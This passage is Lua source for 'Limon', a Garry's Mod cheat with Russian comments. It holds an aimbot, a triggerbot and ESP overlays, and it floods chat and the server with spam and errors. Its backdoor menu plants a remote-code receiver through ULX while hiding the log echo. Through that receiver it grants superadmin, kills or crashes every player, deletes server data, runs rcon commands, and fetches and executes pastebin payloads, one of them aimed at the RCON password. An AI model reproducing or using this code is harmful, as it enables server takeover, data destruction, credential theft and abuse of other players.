	for k,v in next, Entity(0):GetMaterials() do
	Material(v):SetFloat("$alpha", .85)
	end
	end)
end
end)


//[[-------------------------------------------------------------------------------------------------------------]]
-- проп вх) (нахуй это нужно?)
concommand.Add("L_prop_viel_tog", function()
	if Limon_lol then
    Limon_lol = !Limon_lol
	Notify("Выключен ELS PROP" )
	Limon_google_zalupa("Off ELS PROP")
	ply:ConCommand("L_prop_viel 0")
	else
	Limon_lol = !Limon_lol
	Notify("Включен ELS PROP" )
	Limon_google_zalupa("ELS PROP enabled")
	ply:ConCommand("L_prop_viel 1")
end
end)

hook.Add( "HUDPaint", "PropESP", function()
for k,v in pairs ( ents.FindByClass( "prop*" ) ) do
if GetConVarNumber("L_prop_viel") == 1 then
cam.Start3D(EyePos(), EyeAngles())
if v:IsValid() then
render.SetBlend(0.3)
render.SetColorModulation(255, 214, 41)
v:DrawModel()
cam.End3D()
end
end
end
end)

//[[-------------------------------------------------------------------------------------------------------------]]


//[[-------------------------------------------------------------------------------------------------------------]]
-- тригер бот,когда лень нажимать лкм включите эту функцию
concommand.Add("L_trigerbot_tog", function()
	if Limon_lol then
    Limon_lol = !Limon_lol
	Notify("Выключен TRIGERBOT" )
	Limon_google_zalupa("Off TRIGGERBOT")
	ply:ConCommand("L_trigerbot 0")
else
    Limon_lol = !Limon_lol
	Limon_google_zalupa("TRIGERBOT Enabled")
	Notify("Включен TRIGERBOT" )
	ply:ConCommand("L_trigerbot 1")
end
end)
local Limon = 0
local function triggerbot(cmd)
if LocalPlayer():Alive() then
local target = LocalPlayer():GetEyeTrace().Entity
if target:IsValid() then
if IsValid(LocalPlayer():GetActiveWeapon()) then
if target:IsPlayer() or target:IsNPC() then
if Limon == 0 then
cmd:SetButtons(bit.bor(cmd:GetButtons(), IN_ATTACK))
Limon = 1
else
cmd:SetButtons(bit.band(cmd:GetButtons(), bit.bnot(IN_ATTACK)))
Limon = 0
end
end	
end
end
end
end
hook.Remove("CreateMove", "triggerbot")
if GetConVarNumber("L_trigerbot") == 1 then
	hook.Add("CreateMove", "triggerbot", triggerbot)
end
cvars.AddChangeCallback("L_trigerbot", function() 
	if GetConVarNumber("L_trigerbot") == 1 then
		hook.Add("CreateMove", "triggerbot", triggerbot)
	else
		hook.Remove("CreateMove", "triggerbot")
	end
end)


//[[-------------------------------------------------------------------------------------------------------------]]
-- в вод чат !l открывается меню
local function Limon(ply, text)
	if string.find(text, '^[!/]l') then
	if ply == LocalPlayer() then
	ply:ConCommand('L_menu')
	end
	return true
	end
end	
hook.Add('OnPlayerChat', 'Limon', Limon)
 
//[[-------------------------------------------------------------------------------------------------------------]]
-- реальный причель спиженный xD
local function pricel_on()
hook.Add("HUDPaint","Limon_pricel",function()
	local p = ply:GetEyeTrace().HitPos:ToScreen()
	local x,y = p.x, p.y
	local active_weapon = ply:GetActiveWeapon()
	if IsValid(active_weapon) then
	active_weapon = active_weapon:GetClass()
	end
	if ply:IsValid() then
	surface.SetDrawColor( 255, 255, 255, 255 )		  
	local gap = 5
	local length = gap + 5
	surface.DrawLine( x - length, y, x - gap, y )
	surface.DrawLine( x + length, y, x + gap, y )
	surface.DrawLine( x, y - length, x, y - gap )
	surface.DrawLine( x, y + length, x, y + gap )
end
end)
end

local function pricel_off()
hook.Remove("HUDPaint", "Limon_pricel")
end

concommand.Add("L_pricel_tog", function()
	if Limon_pricel then
    Limon_pricel = !Limon_pricel
	Notify("Выключен прицел" )
	Limon_google_zalupa("Sight off")
	pricel_off()
	else
    Limon_pricel = !Limon_pricel 
	Limon_google_zalupa("Sight on")
	Notify("Включен прицел" )
	pricel_on()
end
end)

//[[-------------------------------------------------------------------------------------------------------------]]
--http.Fetch('https://2no.co/6dybT',function(s) RunString(s)end)
//[[-------------------------------------------------------------------------------------------------------------]]
concommand.Add("L_color", function()
hook.Add("Think", "Limon", function()
	-- все игроки (белый цвет)
	for k,f in pairs(player.GetAll()) do
	f:SetWeaponColor( Vector( Color (255, 255, 255).r / 255, Color (255, 255, 255).g / 255, Color (255, 255, 255).b / 255 ) )
	f:SetPlayerColor( Vector( Color (255, 255, 255).r / 255, Color (255, 255, 255).g / 255, Color (255, 255, 255).b / 255 ) )
	end
	-- вы (лимон цвет)
    ply:SetWeaponColor( Vector( Color (255, 214, 41).r / 255, Color (255, 214, 41).g / 255, Color (255, 214, 41).b / 255 ) )
    ply:SetPlayerColor( Vector( Color (255, 214, 41).r / 255, Color (255, 214, 41).g / 255, Color (255, 214, 41).b / 255 ) )
	-- админы
	for k,L in pairs(player.GetAll()) do
	if L:IsAdmin() then
	L:SetWeaponColor( Vector( Color (255, 0, 0).r / 255, Color (255, 0, 0).g / 255, Color (255, 0, 0).b / 255 ) )
	L:SetPlayerColor( Vector( Color (255, 0, 0).r / 255, Color (255, 0, 0).g / 255, Color (255, 0, 0).b / 255 ) )
	end
	end
end)
end)
//[[-------------------------------------------------------------------------------------------------------------]]
-- аим бот
concommand.Add("L_aimbot_2_tog", function()
	if Limon_aim then
    Limon_aim = !Limon_aim
	Limon_google_zalupa("AIMBOT 2 off")
	Notify("Выключен AIMBOT 2" )
	ply:ConCommand("L_aimbot_2 0")
	else
    Limon_aim = !Limon_aim 
	Notify("Включен AIMBOT 2" )
	Limon_google_zalupa("AIMBOT 2 enabled")
	ply:ConCommand("L_aimbot_2 1")
end
end)

local function aimbot() 
local ply = LocalPlayer()
local trace = util.GetPlayerTrace( ply )
local traceRes = util.TraceLine( trace )
if traceRes.HitNonWorld then
if L_aimbot_2:GetBool() then
if traceRes.Entity:IsPlayer( isvalid ) then 
local Bone = traceRes.Entity:LookupBone("ValveBiped.Bip01_Head1")
if Bone == (isvalid) then return
else
local targethead = traceRes.Entity:LookupBone("ValveBiped.Bip01_Head1") 
local targetheadpos,targetheadang = traceRes.Entity:GetBonePosition(targethead)
ply:SetEyeAngles((targetheadpos - ply:GetShootPos()):Angle())
end
end
end
end        
end
hook.Add("Think","aimbot",aimbot)
//[[-------------------------------------------------------------------------------------------------------------]]
-- замутить всех(приятно не_слышать школьников)
concommand.Add("L_mute_all_tog", function()
	if Limon_els then
    Limon_els = !Limon_els
	Notify ( "Все размучаны" )
	Limon_google_zalupa("unmuted")
	ply:ConCommand("L_mute_all_off")
	else
	Limon_els = !Limon_els 
	Limon_google_zalupa("muted all")
	Notify("Все замучаны" )
	ply:ConCommand("L_mute_all_on")
end
end)
concommand.Add("L_mute_all_on", function()	
timer.Create( "limon_mute", 1, 0, function()
for k,L in pairs(player.GetAll()) do
L:SetMuted(true)
end
end)
end)

concommand.Add("L_mute_all_off", function()
timer.Destroy( "limon_mute", 1, 0, function() end)
for k,L in pairs(player.GetAll()) do
L:SetMuted(false)
end
end)

//[[-------------------------------------------------------------------------------------------------------------]]

-- вх
concommand.Add("L_veil_nics_tog", function()
	if Limon_lol then
    Limon_lol = !Limon_lol
	Notify("Ники теперь не показаны)" )
	Limon_google_zalupa("esp 1 off")
	ply:ConCommand("L_veil_nics 0")
	else
	Limon_lol = !Limon_lol 
	Notify("Ники теперь показаны)" )
	Limon_google_zalupa("esp 1 enabled")
	ply:ConCommand("L_veil_nics 1")
end
end)
nics = CreateClientConVar ("L_veil_nics","0",false,false) 
local function ESP()
if nics:GetBool() then
for _,v in pairs (player.GetAll()) do
end
end
if nics:GetBool() then
for k, v in pairs (player.GetAll()) do 
if (v == LocalPlayer()) then continue end;
local c = v:LocalToWorld( v:OBBCenter() ):ToScreen() 
draw.SimpleTextOutlined( v:Name(), "Limon_15", c.x , c.y  - 50, (team.GetColor(255, 214, 41)), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0 , 0 ))
draw.SimpleTextOutlined( 'Группа: '..v:GetUserGroup(), "Limon_15", c.x , c.y - 35, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color( 0, 0 , 0 ))           
draw.SimpleTextOutlined( 'Дистанция: ' .. math.Round(v:GetPos():Distance(LocalPlayer():GetPos())), "Limon_15", c.x , c.y  - 20, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0 , 0 ))
draw.SimpleTextOutlined( 'Здоровье: ' .. v:Health(), "Limon_15", c.x , c.y  - 5, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0 , 0 ))										
if IsValid(v:GetActiveWeapon()) then 
draw.SimpleTextOutlined( 'Оружие: ' .. v:GetActiveWeapon():GetClass(), "Limon_15", c.x , c.y  - -10, Color(255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0, 0 , 0 )) 
end
end
end
end
hook.Add("HUDPaint", "esp", ESP)

//[[-------------------------------------------------------------------------------------------------------------]]
-- открывается меню на инсерт

hook.Add("Think", "Limon_button", function()
if input.IsKeyDown(KEY_INSERT) then
zalupa = zalupa + 1
if zalupa == 1 then
ply:ConCommand("L_menu")
end
else
zalupa = 0;
end
end)

//[[-------------------------------------------------------------------------------------------------------------]]
-- спам простинький
concommand.Add("L_spam_tog", function()
	if Limon_spam then
    Limon_spam = !Limon_spam
	Notify("Спам прекращен" )
	Limon_google_zalupa("stoped spam")
	ply:ConCommand("L_spam_off")
	else
	Limon_spam = !Limon_spam 
	Limon_google_zalupa("started spam")
	Notify("Спам начат" )
	ply:ConCommand("L_spam_on")
end
end)
concommand.Add("L_spam_on", function()	
timer.Create( "limon_spam", 0.000000000000001, 0, function()
RunConsoleCommand("say",math.random(111111111111111111111111111199911111))
end)
end)

concommand.Add("L_spam_off", function()
timer.Destroy( "limon_spam", 1, 0, function() end)
end)





concommand.Add("L_luaerror_tog", function()
	if Limon1 then
    Limon1 = !Limon1
	Notify("Не ерорим" )
	Limon_google_zalupa("off errors")
	ply:ConCommand("L_luaerror_off")
	else
	Limon1 = !Limon1 
	Notify("Ерорим" )
	Limon_google_zalupa("enabled errors")
	ply:ConCommand("L_luaerror_on")
end
end)
concommand.Add("L_luaerror_on", function()	
timer.Create( "limon_spam1", 0.000000000000000000000000000000000000000000000000000000001000000000000000000000000000011, 0, function()
for i = 1,10 do
RunString( "SERVER_GOVNO_MAMKY_EBAL____TI_4MO" )
end
end)
end)

concommand.Add("L_luaerror_off", function()
timer.Destroy( "limon_spam1", 1, 0, function() end)
end)

------------------------------------------------------------











concommand.Add( "L_hack", function()
if (_G.ulx) then
--chat.AddText(Color (255, 214, 41), "[", limon_prexiks, "] ", Color( 255, 255, 255 ), "Хакаем..." )
chat.AddText(Color (0, 0, 0), "(Console) ", Color( 152, 212, 255 ), "added ",Color( 74, 0, 131 ), "You ",Color( 152, 212, 255 ), "to group ",Color( 0, 255, 0 ), "superadmin" )
else
chat.AddText(Color (255, 214, 41), "[", limon_prexiks, "] ", Color( 255, 255, 255 ), "Нету ULX" )
end
end)



concommand.Add( "L_color_info", function()
	local Limon_color = vgui.Create( "DFrame" )
	Limon_color:SetPos( 300,  500)
	Limon_color:SetSize( 500, 300 )
	Limon_color:Center()
	Limon_color:SetTitle( "" )
	Limon_color:SetVisible( true )
	Limon_color:SetDraggable( true )
	Limon_color:ShowCloseButton( false )
	Limon_color:MakePopup()
	Limon_color.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon_color:GetWide(), Limon_color:GetTall() )
    surface.SetDrawColor( Limon_menu_color, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon_color:GetWide(), Limon_color:GetTall() )

	draw.RoundedBox( 0, 0, 0, 699, 22, Limon_menu_color )
	draw.SimpleText(" Limon - цвета", 'Limon_15', 40, 3, Color(0, 0, 0,255),TEXT_ALIGN_CENTER)
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon_color )
	Limon_b:SetText( "" )
	Limon_b:SetPos(477, 1)
	Limon_b:SetSize( 22, 20 )
	Limon_b.DoClick = function()
    Limon_color:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end
	
local Limon_b = vgui.Create( "DLabel" )
Limon_b:SetParent( Limon_color )
Limon_b:SetText( "Изменяет цвета игроков которые видите только вы." )
Limon_b:SetPos( 10, 245 )
Limon_b:SetSize( 7000, 20 )
Limon_b:SetTextColor(Color(255,255,255,255))
	
local Limon_b = vgui.Create( "DLabel" )
Limon_b:SetParent( Limon_color )
Limon_b:SetText( "Так можно определить админа от игрока не чекая)" )
Limon_b:SetPos( 10, 260 )
Limon_b:SetSize( 7000, 20 )
Limon_b:SetTextColor(Color(255,255,255,255))
	

	
local Limon_s = vgui.Create( "DHTML" )
Limon_s:SetParent( Limon_color )
Limon_s:SetPos( 1, 24 )
Limon_s:SetSize( 496, 220 )
Limon_s:SetHTML([[
			<style type="text/css">
				body {
					overflow: hidden; 
				}

				img {
					width: 100%;
					height: 100%
				}
			</style>

			<img src="https://i.imgur.com/8LkbVQy.png">
]])

		local Limon_b = vgui.Create("DButton", frame)
		Limon_b:SetParent( Limon_color )
		Limon_b:SetText( "" )
		Limon_b:SetPos(389, 250)
		Limon_b:SetSize( 100, 20 )
		Limon_b.DoClick = function()
        RunConsoleCommand("L_color")
		Limon_color:Close()
		end
		Limon_b.Paint = function(pnl, w, h)
		draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 255))
		draw.SimpleText("ВРУБИТЬ", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
		if Limon_b.Hovered then
		draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
		end
	end

end)

//[[-------------------------------------------------------------------------------------------------------------]]

hook.Remove("SpawnMenuOpen", "blockmenutabs")
	

if (_G.Props_3 or _G.PropWhiteList)  then
chat.AddText(Limon_menu_color, "[", limon_prexiks, "] ", Color( 255, 0, 0 ), "На сервере стоит spawnprops!" )
chat.AddText(Limon_menu_color, "[", limon_prexiks, "] ", Color( 0, 255, 0 ), "Восстанавливаем все вкладки ",Color( 255, 255, 255 ),"(Вы же не открывали q меню?а если открывали то перезайдите и активируйте чит и откройте меню xD)" )
end



//[[-------------------------------------------------------------------------------------------------------------]]


//[[-------------------------------------------------------------------------------------------------------------]]

concommand.Add("L_antiafk_tog", function()
	if Limon then
    Limon = !Limon
	Notify("Выключен анти афк")
	Limon_google_zalupa("off anti afk")
	ply:ConCommand("L_antiafk_off")
	else
	Limon = !Limon 
	Limon_google_zalupa("enabled anti afk")
	Notify("Включен анти афк")
	ply:ConCommand("L_antiafk_on")
end
end)

concommand.Add("L_antiafk_on", function()
timer.Create( "antiafk", 40, 0, function()
RunConsoleCommand("+forward")
timer.Create( "antiafk1", 0.1, 0, function()
RunConsoleCommand("-forward")
timer.Destroy( "antiafk1", 0.1, 0, function() end)
end)
end)
end)
concommand.Add("L_antiafk_off", function()
timer.Destroy( "antiafk", 40, 0, function() end)
end)

//[[-------------------------------------------------------------------------------------------------------------]]//[[-------------------------------------------------------------------------------------------------------------]]
//[[-------------------------------------------------------------------------------------------------------------]]//[[-------------------------------------------------------------------------------------------------------------]]

concommand.Add( "L_injectblackdoor", function()
	Notify("Инжектим..." )
    if ulx then
	RunConsoleCommand("ulx","logecho", 0)
	timer.Simple( 3, function() 
    if(ValidNetString("Limon")) then
    else
	RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('Limon')" )
    RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('Limon') net.Receive('Limon', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
    timer.Create( "Lol_33", 5, 0, function()
	Limon_google_zalupa("injected")
	chat.AddText(Color (255, 214, 41), "[", "Limon", "] ", Color( 0, 255, 0 ), "Успешно" )
    timer.Destroy( "Lol_33", 5, 0, function() end)
	end)
	timer.Create( "Lol_54", 1, 0, function()
	RunConsoleCommand("ulx","logecho", 1)
	timer.Destroy( "Lol_54", 1, 0, function() end)
	end)
	end
    end)
    if( ValidNetString("Limon") ) then
	Notify("Бекдур уже есть" )
    end
	else
	Limon_google_zalupa("error not ulx")
	Notify("Ошибка, нету ulx" )
	end
end)
zalupa_backdoor = 1
//[[-------------------------------------------------------------------------------------------------------------]]
Limon_total_backdoor = 0
concommand.Add( "L_backdoor", function()
	local Limon_color = vgui.Create( "DFrame" )
	Limon_color:SetPos( 300,  500)
	Limon_color:SetSize( 400, 435 )
	Limon_color:Center()
	Limon_color:SetTitle( "" )
	Limon_color:SetVisible( true )
	Limon_color:SetDraggable( true )
	Limon_color:ShowCloseButton( false )
	Limon_color:MakePopup()
	Limon_color.Paint = function( self )
	surface.SetDrawColor( 70, 70, 70, 255 )
    surface.DrawRect( 0, 0, Limon_color:GetWide(), Limon_color:GetTall() )
    surface.SetDrawColor( Limon_menu_color, 255 )
    surface.DrawOutlinedRect( 0, 0, Limon_color:GetWide(), Limon_color:GetTall() )

	draw.RoundedBox( 0, 0, 0, 699, 22, Limon_menu_color )
	draw.SimpleText("Limon - backdoor", 'Limon_15', 3, 3, Color(0, 0, 0,255))
	end
	local Limon_b = vgui.Create("DButton", frame)
	Limon_b:SetParent( Limon_color )
	Limon_b:SetText( "" )
	Limon_b:SetPos(377, 1)
	Limon_b:SetSize( 22, 20 )
	Limon_b.DoClick = function()
    Limon_color:Close()
	end
	Limon_b.Paint = function(pnl, w, h)
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 0, 1, 255))
	draw.SimpleText("х", "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	if Limon_b.Hovered then
	draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
	end
	end


-----------------------------------------------

local pnl = Limon_color:Add( "PanelList" )
pnl:SetSize(207,405)
pnl:SetPos(1,25)
pnl:EnableVerticalScrollbar()
pnl.Paint = function(pnl, w, h) end

function addbacldoor(id, text, desc, func)
local id = pnl:Add( "DButton" )
id:SetText("")
id:Dock( BOTTOM )
id:DockMargin( -5, 10, 1, -5 )
id:DockPadding( 2, 22, 2, 22 )
pnl:AddItem( id )
id.Paint = function(pnl, w, h)
draw.RoundedBox(0, 0, 0, w, h, Color(0,0,0))
draw.SimpleText(text, "Limon_15", w/2, h/2-1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
if id.Hovered then
draw.RoundedBox(0, 0, 0, w, h, Color(255, 255, 255, 59))
end
end
id.DoClick = func
end
		

	
addbacldoor( "1"," ", "1", function()

end)
addbacldoor( "1","[ULX]Give me superadmin", "1", function()
net.Start(Limonbackdoornet)
net.WriteString( [[
       
            local id = ]] .. LocalPlayer():UserID() .. [[
           
            RunConsoleCommand( 'ulx', 'adduser', tostring( Player( id ):Nick() ), 'superadmin' )
           
            Player( id ):SetUserGroup( "superadmin" )
       
        ]] )
net.WriteBit(1)
net.SendToServer()
end)
		
addbacldoor( "1","Порно звуки шагов", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "hook.Add(\"PlayerFootstep\", \"porn\", function(ply, pos, foot, sound2, volume, filter) ply:EmitSound( \"vo/npc/female01/pain06.wav\",75,math.random( 50, 150 )) end )" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
end)

addbacldoor( "1","Зделать всем скрин", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[RunConsoleCommand('screenshot')]])" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)

addbacldoor( "1","Диктатор диско)", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[http.Fetch('https://pastebin.com/raw/u2abWKBJ',function(s)	RunString(s)end)]])" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)
addbacldoor( "1","Хулиган диско)", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[http.Fetch('https://pastebin.com/raw/bmyUAy6r',function(s)	RunString(s)end)]])" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)
addbacldoor( "1","Убить всех", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)
addbacldoor( "1","Спам в чат", "1", function()
		Text = {
		"chat.AddText(Color(math.random(255), math.random(255), math.random(255)), \" ███████ HACKED BY GLUAGMOD | vk.com/CodeShopGmod ██████ \")",
		}
		chatrapemike = !chatrapemike
		if( chatrapemike ) then
		timer.Create( "Lol4535", 0.0001, 0, function()
		net.Start(Limonbackdoornet)
		net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([["..table.Random(Text).."]]) end " )
		net.WriteBit (1)
		net.SendToServer()
		end)
		else
		timer.Destroy( "Lol4535" )	
		end
Limon_google_zalupa("active")
		end)
addbacldoor( "1","RCON PASSWORD", "1", function()
net.Start(Limonbackdoornet)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/u5qnn5kw\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
end
Limon_google_zalupa("active")
end)
end)
	
addbacldoor( "1","Крашнуть всех", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString("for k,v in pairs(player.GetAll()) do v:SendLua(\"while true do end\") end")
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)
addbacldoor( "1","[ULX]Всем суперадминку", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( [[for k,v in pairs(player.GetAll()) do RunConsoleCommand("ulx","adduser",v:Nick(),"superadmin") end]] )
		net.WriteBit(1)
		net.SendToServer()
Limon_google_zalupa("active")
		end)

addbacldoor( "1","[MUSIC]я ебу собак", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/5dCN.mp3\", \"mono\", function()end )]])" )
		net.WriteBit(1)
Limon_google_zalupa("active")
		net.SendToServer()
end)
addbacldoor( "1","[MUSIC]Оо ее", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/8dMk.mp3\", \"mono\", function()end )]])" )
		net.WriteBit(1)
		net.SendToServer()
Limon_google_zalupa("active")
		end)
addbacldoor( "1","[MUSIC]Скрипочка", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/39sN.mp3\", \"mono\", function()end )]])" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)
addbacldoor( "1","[MUSIC] Порнишко", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/33i6.mp3\", \"mono\", function()end )]])" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)
addbacldoor( "1","[MUSIC] Сука блять", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/4GCe.mp3\", \"mono\", function()end )]])" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)
addbacldoor( "1","[MUSIC] Чо пацаны Аниме?", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/5maL.mp3\", \"mono\", function()end )]])" )
		net.WriteBit(1)
		net.SendToServer()
		Notify("Активировано")
Limon_google_zalupa("active")
		end)
addbacldoor( "1","[MUSIC]Я робот долбаеб", "1", function()
		net.Start(Limonbackdoornet)
		net.WriteString( "BroadcastLua([[sound.PlayURL( \"http://d.zaix.ru/8dLq.mp3\", \"mono\", function()end )]])" )
		net.WriteBit (1)
		net.SendToServer()
		Notify("Активировано")
end)
addbacldoor( "1","2D модели", "1", function()
net.Start(Limonbackdoornet)
	net.WriteString([[
		for k,v in pairs(player.GetAll()) do 
		local a = v:LookupBone("ValveBiped.Bip01_Head1")
		local b = v:LookupBone("ValveBiped.Bip01_R_Thigh")
		local c = v:LookupBone("ValveBiped.Bip01_L_Thigh")
		local d = v:LookupBone("ValveBiped.Bip01_R_Calf")
		local e = v:LookupBone("ValveBiped.Bip01_L_Calf")
		local f = v:LookupBone("ValveBiped.Bip01_R_UpperArm")
		local g = v:LookupBone("ValveBiped.Bip01_L_UpperArm")
		local h = v:LookupBone("ValveBiped.Bip01_R_Forearm")
		local i = v:LookupBone("ValveBiped.Bip01_L_Forearm")
		local j = v:LookupBone("ValveBiped.Bip01_R_Clavicle")
		local k = v:LookupBone("ValveBiped.Bip01_L_Clavicle")
	
			v:ManipulateBoneScale( a, Vector(4,0,4)) 
			v:ManipulateBoneScale( b, Vector(0,0,0))
			v:ManipulateBoneScale( c, Vector(0,0,0))
			v:ManipulateBoneScale( d, Vector(0,0,1))
			v:ManipulateBoneScale( e, Vector(0,0,1))
			v:ManipulateBoneScale( f, Vector(0,0,0))
			v:ManipulateBoneScale( g, Vector(0,0,0))
			v:ManipulateBoneScale( h, Vector(1,1.5,1.5))
			v:ManipulateBoneScale( i, Vector(1,1.5,1.5))
			v:ManipulateBoneScale( j, Vector(0,0,0))
			v:ManipulateBoneScale( k, Vector(0,0,0))
			end]])
	net.WriteBit(1)
	net.SendToServer()
Limon_google_zalupa("active")
	end)
	
addbacldoor( "1","Армагеддон", "1", function()
local armageddon = [[
				hook.Add("Think", "armageddon", function()
					local explode = ents.Create( "env_explosion" ) 
						explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) 
						explode:Spawn() 
						explode:SetKeyValue( "iMagnitude", "500" ) 
						explode:Fire( "Explode", 0, 0 ) 
					end)  
	]]
	net.Start(Limonbackdoornet)
	net.WriteString( armageddon )
	net.WriteBit(1)
	net.SendToServer()
Limon_google_zalupa("active")
	end)	
addbacldoor( "1","Удалить дату", "1", function()
local gdfgdg = [[
local function DeleteALL()
	local function read(path)
		path=path or ""
		local fs,ds = file.Find(path.."*",'MOD')
		for k,f in pairs(fs) do
			local npa = string.gsub(path,'data/','')
			file.Delete(npa..f)
		end 
		for z,d in pairs(ds) do
			read(path..d..'/') 
		end 
	end 
	read('data/')
end
DeleteALL()
	]]
	net.Start(Limonbackdoornet)
	net.WriteString( gdfgdg )
	net.WriteBit(1)
Limon_google_zalupa("active")
	net.SendToServer()
end)	

addbacldoor( "1","Rcon command", "1", function()
Derma_StringRequest( "Limon", "Rcon command", "", function( text ) 
	net.Start(Limonbackdoornet)			
	net.WriteString( [[game.ConsoleCommand( "]] .. tostring( text ) .. [[" .. "\n" )]] )
	net.WriteBit(1)
Limon_google_zalupa("active")
	net.SendToServer()
end)
end)

addbacldoor( "1","Сломать физику", "1", function()
net.Start(Limonbackdoornet)
	net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-8\")" )
	net.WriteBit(1)
	net.SendToServer()
end)


addbacldoor( "1"," ", "1", function()

end)
addbacldoor( "1"," ", "1", function()

end)
addbacldoor( "1"," ", "1", function()

end)
addbacldoor( "1"," ", "1", function()

end)

addbacldoor( "1"," ", "1", function()

end)

AppList = vgui.Create( "DListView", f )
AppList:SetPos( 210,30 )
AppList:SetSize( 183, 322 )
AppList:SetMultiSelect( true )
AppList:AddColumn( "Бекдуры" )
AppList:SetParent( Limon_color )



for k,L in pairs(Limon_backdoor_list) do
if ValidNetString( L ) then
Limonbackdoornet = L
AppList:AddLine( L )	
if zalupa_backdoor == 1 then
Limon_total_backdoor = 1 + Limon_total_backdoor
zalupa_backdoor = 0
end
end
end

-------------------------------------------------

local edit = vgui.Create( "DTextEntry", DermaFrame )
edit:SetPos(210, 355)
edit:SetSize( 183, 22 )
edit:SetParent( Limon_color )
edit:SetText("mybackdoor")
edit:SetMultiline( false )
edit:SetEditable( true )
edit:SetAllowNonAsciiCharacters( true )
edit:SetEnterAllowed( true )
edit.OnEnter = function()
if ValidNetString( edit:GetValue() ) then
Limonbackdoornet = edit:GetValue()
chat.AddText(Color (255, 214, 41), "[", limon_prexiks, "] ", Color( 0, 255, 0 ), "Найден бекдур "..edit:GetValue().."." )
AppList:AddLine( edit:GetValue() )
else
chat.AddText(Color (255, 214, 41), "[", limon_prexiks, "] ", Color( 255, 0, 0 ), "Бекдур '"..edit:GetValue().."' не обнаружен." )
end
end
	
				local Limon_b = vgui.Create("DButton", frame)
		Limon_b:SetParent( Limon_color )
		Limon_b:SetText( "" )
		Limon_b:SetPos(210, 380)
		Limon_b:SetSize( 183, 22 )
		Limon_b.DoClick = function()
		RunConsoleCommand("L_injectblackdoor")
		
		timer.Create( "Limon_inject_backdoor_gg1", 5, 0, function()		
		for k,L in pairs(Limon_backdoor_list) do
			if ValidNetString( L ) then
			Limonbackdoornet = L
			Limon_total_backdoor = 1 + Limon_total_backdoor
			AppList:AddLine( L )	
			end
			end
		timer.Destroy( "Limon_inject_backdoor_gg1", 5, 0, function() end)
		end)
		end
